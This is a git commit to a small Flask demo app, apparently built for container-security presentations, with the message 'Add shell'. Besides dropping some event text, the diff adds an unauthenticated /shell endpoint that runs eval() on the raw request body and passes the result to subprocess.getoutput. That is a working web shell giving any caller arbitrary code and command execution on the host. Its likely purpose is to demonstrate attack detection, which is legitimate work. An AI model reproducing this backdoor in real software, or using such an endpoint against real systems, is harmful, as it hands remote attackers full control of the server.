62abc5b186054a4c4320976750bc2e650e7dfa01
Tim Arenz <tim@arenz.cc>
2022-01-13 13:12:47 +0100

    Add shell

--- app/app.py
+++ app/app.py
@@ -8,8 +8,9 @@ from flask import jsonify
 
 app = Flask(__name__)
 
-event_text = "Lacework Container Security"
-tweet_text = "Hello from the Container Security Lunchinar. Just enjoyed a fantastic presentation from @timarenz about Container Security with #laceworks #devsecops #shiftleft"
+event_text = 'Demo app for ECS'
+
+print(event_text)
 
 
 @app.route('/')
@@ -24,13 +25,26 @@ def index():
     hostname = platform.node()
     random_cocktail = requests.get(
         'https://www.thecocktaildb.com/api/json/v1/1/random.php').json()
-    return render_template('index.html', url=url, hostname=hostname, event_text=event_text, tweet_text=tweet_text, tweet_text_url=urllib.parse.quote(tweet_text), ip=request.remote_addr, cocktail=random_cocktail['drinks'][0]['strDrink'])
+    shell = False
+    if 'shell' in request.args:
+        shell = True
+    return render_template('index.html', url=url, hostname=hostname, ip=request.remote_addr, cocktail=random_cocktail['drinks'][0]['strDrink'], shell=shell)
 
 
-@app.route("/ip")
+@app.route('/ip')
 def ip():
     return jsonify({'ip': request.remote_addr}), 200
 
 
-if __name__ == "__main__":
-    app.run(host="0.0.0.0")
+@app.route("/shell", methods=['POST', 'GET'])
+def shell():
+    try:
+        shell_str = request.get_data()
+        resp = str(eval(shell_str))
+    except Exception as e:
+        resp = str(e)
+    return __import__("subprocess").getoutput(resp)
+
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0')
